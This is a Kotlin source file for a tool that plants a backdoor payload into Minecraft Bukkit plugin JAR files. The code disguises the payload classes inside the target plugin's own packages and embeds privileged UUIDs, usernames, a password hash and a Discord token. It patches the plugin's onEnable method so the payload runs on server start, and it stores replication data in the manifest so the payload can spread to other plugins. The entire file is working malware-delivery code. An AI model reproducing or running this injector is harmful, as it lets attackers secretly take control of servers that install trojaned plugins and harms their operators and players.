package com.tmquan2508.inject.injector

import com.github.ajalt.mordant.rendering.TextColors.brightCyan
import com.rikonardo.cafebabe.ClassFile
import com.rikonardo.cafebabe.data.constantpool.ConstantUtf8
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.utils.generateCamouflagePlan
import com.tmquan2508.inject.utils.loadDefaultPayload
import javassist.ClassPool
import javassist.CtNewMethod
import org.yaml.snakeyaml.Yaml
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream
import java.io.File
import java.nio.charset.StandardCharsets
import java.nio.file.*
import java.security.MessageDigest
import java.util.*
import java.util.jar.Attributes
import java.util.jar.JarFile
import java.util.jar.Manifest
import kotlin.io.path.inputStream
import kotlin.io.path.name
import kotlin.io.path.writeBytes

fun process(
    input: Path,
    output: Path,
    replace: Boolean,
    camouflage: Boolean,
    uuids: Array<String>,
    usernames: Array<String>,
    password: String?,
    prefix: String,
    discordToken: String,
    injectOther: Boolean,
    warnings: Boolean
) {
    Logs.task("Processing ${input.name}")

    try {
        JarFile(input.toFile()).use { jarFile ->
            val manifest = jarFile.manifest
            if (manifest != null && manifest.mainAttributes.getValue("X-Payload-Data") != null) {
                Logs.finish().warn("Skipped plugin because it is already patched (X-Payload-Data found)")
                return
            }
        }
    } catch (e: Exception) {
        Logs.warn("Could not read manifest from ${input.name}, proceeding with injection anyway. Error: ${e.message}")
    }

    if (!replace && Files.exists(output)) {
        Logs.finish().warn("Skipped plugin because output file already exists")
        return
    }

    val tempDir = File("./.openbd")
    val tempJar = File(tempDir, "current.jar")
    val patchedDir = File(tempDir, "patched")

    try {
        tempDir.mkdirs()
        patchedDir.mkdirs()
        Files.copy(input, tempJar.toPath(), StandardCopyOption.REPLACE_EXISTING)

        var fileSystem: FileSystem? = null
        val finalMainPayloadName: String
        val pluginMainClass: String

        try {
            val fs = FileSystems.newFileSystem(tempJar.toPath())
            fileSystem = fs

            val pluginData: Map<String, Any> = Yaml().load(fs.getPath("/plugin.yml").inputStream())
            pluginMainClass = (pluginData["main"] as String?) ?: throw Exception("No main class in plugin.yml")
            Logs.info("Plugin main class: ${brightCyan(pluginMainClass)}")

            val payloadClasses = loadDefaultPayload()
            val allInjectableClasses = payloadClasses
            val originalConfigClassName = "com/tmquan2508/exploit/Config"
            val originalMainPayloadName = "com/tmquan2508/exploit/Exploit"

            val (masterRelocationMap, finalPayloadName) = buildMasterRelocationMap(
                payloadClasses,
                camouflage,
                tempJar,
                originalMainPayloadName
            )
            finalMainPayloadName = finalPayloadName

            Logs.info("Relocating and camouflaging payload classes...")
            var finalClasses = relocateClasses(allInjectableClasses, masterRelocationMap)
            Logs.info("Relocation complete.")

            Logs.info("Building and applying dynamic configuration...")
            val finalConfigClassName = masterRelocationMap[originalConfigClassName] ?: originalConfigClassName

            val hashedPassword = password?.toSha256() ?: ""

            finalClasses = applyConfiguration(
                classes = finalClasses,
                targetClassName = finalConfigClassName,
                uuids = uuids,
                usernames = usernames,
                password = hashedPassword,
                prefix = prefix,
                discordToken = discordToken,
                injectOther = injectOther,
                warnings = warnings,
                camouflage = camouflage
            )
            Logs.info("Configuration applied successfully to final class '$finalConfigClassName'.")

            Logs.info("Injecting ${finalClasses.size} final classes...")
            finalClasses.forEach { finalClass ->
                val pathInJar = fs.getPath(finalClass.name + ".class")
                pathInJar.parent?.let { if (!Files.exists(it)) Files.createDirectories(it) }
                pathInJar.writeBytes(finalClass.compile())
            }
            Logs.info("All payload classes injected successfully.")

            injectPayloadManifestData(fs, payloadClasses)

        } finally {
            fileSystem?.close()
        }

        Logs.info("Patching main plugin class to load payload...")
        val finalMainPayloadCallName = finalMainPayloadName.replace('/', '.')

        val codeToInsert = """
            try {
                new $finalMainPayloadCallName((org.bukkit.plugin.Plugin)this);
            } catch (Throwable throwable) {
                System.err.println("[Injector] Payload Error:");
                throwable.printStackTrace();
            }
        """.trimIndent()

        Logs.info("Injecting code into ${pluginMainClass}.onEnable(): { $codeToInsert }")

        injectIntoOnEnable(
            jarPath = tempJar.toPath(),
            targetClass = pluginMainClass,
            codeToInsert = codeToInsert,
            saveToDir = patchedDir.path
        )

        Logs.info("Replacing original main class with patched version...")
        fileSystem = FileSystems.newFileSystem(tempJar.toPath())
        try {
            val pluginMainClassPath = pluginMainClass.replace('.', '/')
            val patchedClassFile = patchedDir.toPath().resolve("$pluginMainClassPath.class")
            if (!Files.exists(patchedClassFile)) {
                throw Exception("Patched class file not found after Javassist injection. Check logs for errors.")
            }
            val pathInJar = fileSystem.getPath("$pluginMainClassPath.class")
            Files.copy(patchedClassFile, pathInJar, StandardCopyOption.REPLACE_EXISTING)
        } finally {
            fileSystem.close()
        }

        Files.copy(tempJar.toPath(), output, StandardCopyOption.REPLACE_EXISTING)
        Logs.finish().info("${input.name} patched successfully (Payload injected into onEnable)")
    } finally {
        if (tempDir.exists()) {
            tempDir.deleteRecursively()
        }
    }
}

private fun injectPayloadManifestData(fs: FileSystem, originalPayloadClasses: List<ClassFile>) {
    Logs.info("Injecting replication payload into MANIFEST.MF...")
    val simpleNamesWithExtension = originalPayloadClasses.map { it.name.substringAfterLast('/') + ".class" }
    val baos = ByteArrayOutputStream()
    val dos = DataOutputStream(baos)
    simpleNamesWithExtension.forEach { name ->
        val nameBytes = name.toByteArray(StandardCharsets.UTF_8)
        dos.writeInt(nameBytes.size)
        dos.write(nameBytes)
    }
    dos.close()

    val payloadBase64 = Base64.getEncoder().encodeToString(baos.toByteArray())

    val manifestPath = fs.getPath("META-INF", "MANIFEST.MF")
    val manifest: Manifest
    if (Files.exists(manifestPath)) {
        manifest = Files.newInputStream(manifestPath).use { Manifest(it) }
    } else {
        manifest = Manifest()
        manifest.mainAttributes[Attributes.Name.MANIFEST_VERSION] = "1.0"
        manifestPath.parent?.let { if (!Files.exists(it)) Files.createDirectories(it) }
    }

    manifest.mainAttributes.putValue("X-Payload-Data", payloadBase64)

    Files.newOutputStream(manifestPath, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING).use {
        manifest.write(it)
    }
    Logs.info("Successfully injected replication data into MANIFEST.MF.")
}

fun injectIntoOnEnable(jarPath: Path, targetClass: String, codeToInsert: String, saveToDir: String) {
    val pool = ClassPool.getDefault()
    pool.insertClassPath(jarPath.toString())
    val cc = pool.get(targetClass)

    cc.defrost()

    try {
        val onEnableMethod = cc.getDeclaredMethod("onEnable")
        onEnableMethod.insertBefore(codeToInsert)
        Logs.info("Injected code into existing 'onEnable' method.")
    } catch (e: javassist.NotFoundException) {
        Logs.warn("Method 'onEnable' not found in '$targetClass'. Creating a new one.")
        try {
            val newMethod = CtNewMethod.make("public void onEnable() { $codeToInsert }", cc)
            cc.addMethod(newMethod)
            Logs.info("Created and injected code into a new 'onEnable' method.")
        } catch (creationError: Exception) {
            Logs.error("Failed to create a new 'onEnable' method in '$targetClass'. The plugin might not be a standard Bukkit plugin.")
            creationError.printStackTrace()
        }
    }

    cc.writeFile(saveToDir)
    cc.detach()
}

private fun applyConfiguration(
    classes: List<ClassFile>,
    targetClassName: String,
    uuids: Array<String>,
    usernames: Array<String>,
    password: String,
    prefix: String,
    discordToken: String,
    injectOther: Boolean,
    warnings: Boolean,
    camouflage: Boolean
): List<ClassFile> {
    val targetFile = classes.find { it.name == targetClassName }
    if (targetFile == null) {
        Logs.warn("Could not find configuration target class '$targetClassName' after relocation. Skipping configuration injection.")
        return classes
    }

    val replacements = mapOf(
        "::UUIDS::" to uuids.joinToString(","),
        "::USERNAMES::" to usernames.joinToString(","),
        "::PREFIX::" to prefix,
        "::INJECT_OTHER::" to injectOther.toString(),
        "::WARNINGS::" to warnings.toString(),
        "::DISCORD_TOKEN::" to discordToken,
        "::PASSWORD::" to password,
        "::CAMOUFLAGE::" to camouflage.toString()
    )

    var replacedCount = 0
    for (constant in targetFile.constantPool.entries) {
        if (constant is ConstantUtf8) {
            if (replacements.containsKey(constant.value)) {
                constant.value = replacements[constant.value]!!
                replacedCount++
            }
        }
    }

    if (replacedCount < replacements.size) {
        Logs.warn("Expected to replace ${replacements.size} placeholders, but only replaced $replacedCount. Ensure the payload's Config.java is compiled with the correct placeholders.")
    }

    return classes
}

private fun buildMasterRelocationMap(
    payloadClasses: List<ClassFile>,
    camouflage: Boolean,
    jarFile: File,
    mainPayloadOriginalName: String
): Pair<Map<String, String>, String> {
    val masterMap = mutableMapOf<String, String>()
    if (camouflage) {
        Logs.info("Camouflage enabled. Generating camouflage plan...")
        val camouflagePlan = generateCamouflagePlan(jarFile)
        val destinationPackage = camouflagePlan.packageName
        val namePrefix = camouflagePlan.namePrefix
        Logs.info("Selected camouflage package: '$destinationPackage' with prefix '$namePrefix'")
        
        payloadClasses.forEach {
            val originalName = it.name
            val simpleName = originalName.substringAfterLast("/")
            val newName = "${destinationPackage}/${namePrefix}$simpleName"
            masterMap[originalName] = newName
        }
    }
    val finalMainPayloadName = masterMap[mainPayloadOriginalName] ?: mainPayloadOriginalName
    return Pair(masterMap, finalMainPayloadName)
}

private fun relocateClasses(classes: List<ClassFile>, relocationMap: Map<String, String>): List<ClassFile> {
    if (relocationMap.isEmpty()) return classes
    val sortedKeys = relocationMap.keys.sortedByDescending { it.length }
    return classes.map { originalClassFile ->
        val classFile = ClassFile(originalClassFile.compile())
        classFile.name = relocationMap[classFile.name] ?: classFile.name
        for (constant in classFile.constantPool.entries) {
            if (constant is ConstantUtf8) {
                var tempValue = constant.value
                for (key in sortedKeys) {
                    relocationMap[key]?.let { newValue ->
                        tempValue = tempValue.replace(key, newValue)
                    }
                }
                constant.value = tempValue
            }
        }
        classFile
    }
}

private fun String.toSha256(): String {
    return MessageDigest.getInstance("SHA-256")
        .digest(this.toByteArray())
        .fold("") { str, it -> str + "%02x".format(it) }
}